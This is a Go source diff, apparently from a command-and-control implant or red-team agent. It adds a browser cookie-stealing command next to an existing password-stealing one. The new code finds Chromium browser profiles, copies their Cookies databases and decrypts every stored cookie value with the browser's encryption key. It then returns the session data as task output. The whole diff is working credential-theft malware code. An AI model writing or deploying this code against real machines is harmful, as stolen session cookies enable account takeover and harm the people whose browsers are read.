@@ -44,6 +44,17 @@ type browserCred struct {
 	Password string
 }
 
+type browserCookie struct {
+	Browser  string
+	Host     string
+	Name     string
+	Value    string
+	Path     string
+	Expires  int64
+	Secure   bool
+	HTTPOnly bool
+}
+
 func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
 	var args browserArgs
 
@@ -64,9 +75,11 @@ func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
 	switch strings.ToLower(args.Action) {
 	case "passwords":
 		return browserPasswords(args)
+	case "cookies":
+		return browserCookies(args)
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: passwords", args.Action),
+			Output:    fmt.Sprintf("Unknown action: %s. Use: passwords, cookies", args.Action),
 			Status:    "error",
 			Completed: true,
 		}
@@ -403,4 +416,189 @@ func readLoginData(dbPath string, key []byte, browserName, profileName string) (
 	}
 
 	return creds, nil
+}
+
+// findCookieProfiles returns profile directories containing Cookies or Network/Cookies
+func findCookieProfiles(userDataDir string) []string {
+	var profiles []string
+
+	checkProfile := func(dir string) {
+		// Chrome 96+ stores cookies in Network/Cookies
+		networkCookies := filepath.Join(dir, "Network", "Cookies")
+		if _, err := os.Stat(networkCookies); err == nil {
+			profiles = append(profiles, dir)
+			return
+		}
+		// Older versions store in profile/Cookies
+		cookies := filepath.Join(dir, "Cookies")
+		if _, err := os.Stat(cookies); err == nil {
+			profiles = append(profiles, dir)
+		}
+	}
+
+	checkProfile(filepath.Join(userDataDir, "Default"))
+
+	entries, err := os.ReadDir(userDataDir)
+	if err != nil {
+		return profiles
+	}
+	for _, entry := range entries {
+		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
+			checkProfile(filepath.Join(userDataDir, entry.Name()))
+		}
+	}
+
+	return profiles
+}
+
+// cookieDBPath returns the path to the Cookies database for a profile
+func cookieDBPath(profileDir string) string {
+	// Chrome 96+ path
+	networkPath := filepath.Join(profileDir, "Network", "Cookies")
+	if _, err := os.Stat(networkPath); err == nil {
+		return networkPath
+	}
+	return filepath.Join(profileDir, "Cookies")
+}
+
+func browserCookies(args browserArgs) structs.CommandResult {
+	paths := browserPaths(args.Browser)
+	if paths == nil {
+		return structs.CommandResult{
+			Output:    "Could not determine LOCALAPPDATA path",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	var allCookies []browserCookie
+	var errors []string
+
+	for browserName, userDataDir := range paths {
+		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
+			continue
+		}
+
+		key, err := getEncryptionKey(userDataDir)
+		if err != nil {
+			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
+			continue
+		}
+
+		profiles := findCookieProfiles(userDataDir)
+		if len(profiles) == 0 {
+			errors = append(errors, fmt.Sprintf("%s: no profiles with Cookies found", browserName))
+			continue
+		}
+
+		for _, profileDir := range profiles {
+			dbPath := cookieDBPath(profileDir)
+
+			tf, tfErr := os.CreateTemp("", "")
+			if tfErr != nil {
+				errors = append(errors, fmt.Sprintf("%s (%s): create temp: %v", browserName, filepath.Base(profileDir), tfErr))
+				continue
+			}
+			tmpFile := tf.Name()
+			tf.Close()
+			if err := copyFile(dbPath, tmpFile); err != nil {
+				os.Remove(tmpFile)
+				errors = append(errors, fmt.Sprintf("%s (%s): copy Cookies: %v", browserName, filepath.Base(profileDir), err))
+				continue
+			}
+
+			cookies, err := readCookieData(tmpFile, key, browserName, filepath.Base(profileDir))
+			os.Remove(tmpFile)
+			if err != nil {
+				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, filepath.Base(profileDir), err))
+				continue
+			}
+			allCookies = append(allCookies, cookies...)
+		}
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("=== Browser Cookies (%d found) ===\n\n", len(allCookies)))
+
+	for _, c := range allCookies {
+		flags := ""
+		if c.Secure {
+			flags += " Secure"
+		}
+		if c.HTTPOnly {
+			flags += " HttpOnly"
+		}
+		sb.WriteString(fmt.Sprintf("[%s] %s  %s=%s  (path=%s%s)\n",
+			c.Browser, c.Host, c.Name, truncStr(c.Value, 80), c.Path, flags))
+	}
+
+	if len(errors) > 0 {
+		sb.WriteString("\n--- Errors ---\n")
+		for _, e := range errors {
+			sb.WriteString(fmt.Sprintf("  %s\n", e))
+		}
+	}
+
+	if len(allCookies) == 0 && len(errors) == 0 {
+		sb.WriteString("No Chromium-based browsers found or no cookies.\n")
+	}
+
+	return structs.CommandResult{
+		Output:    sb.String(),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+func readCookieData(dbPath string, key []byte, browserName, profileName string) ([]browserCookie, error) {
+	db, err := sql.Open("sqlite", dbPath)
+	if err != nil {
+		return nil, fmt.Errorf("open database: %w", err)
+	}
+	defer db.Close()
+
+	rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value) > 0")
+	if err != nil {
+		return nil, fmt.Errorf("query cookies: %w", err)
+	}
+	defer rows.Close()
+
+	var cookies []browserCookie
+	label := browserName
+	if profileName != "Default" {
+		label = fmt.Sprintf("%s (%s)", browserName, profileName)
+	}
+
+	for rows.Next() {
+		var host, name, path string
+		var encValue []byte
+		var expiresUTC int64
+		var isSecure, isHTTPOnly int
+
+		if err := rows.Scan(&host, &name, &encValue, &path, &expiresUTC, &isSecure, &isHTTPOnly); err != nil {
+			continue
+		}
+
+		if len(encValue) == 0 {
+			continue
+		}
+
+		value, err := decryptPassword(encValue, key)
+		if err != nil || value == "" {
+			continue
+		}
+
+		cookies = append(cookies, browserCookie{
+			Browser:  label,
+			Host:     host,
+			Name:     name,
+			Value:    value,
+			Path:     path,
+			Expires:  expiresUTC,
+			Secure:   isSecure != 0,
+			HTTPOnly: isHTTPOnly != 0,
+		})
+	}
+
+	return cookies, nil
 }
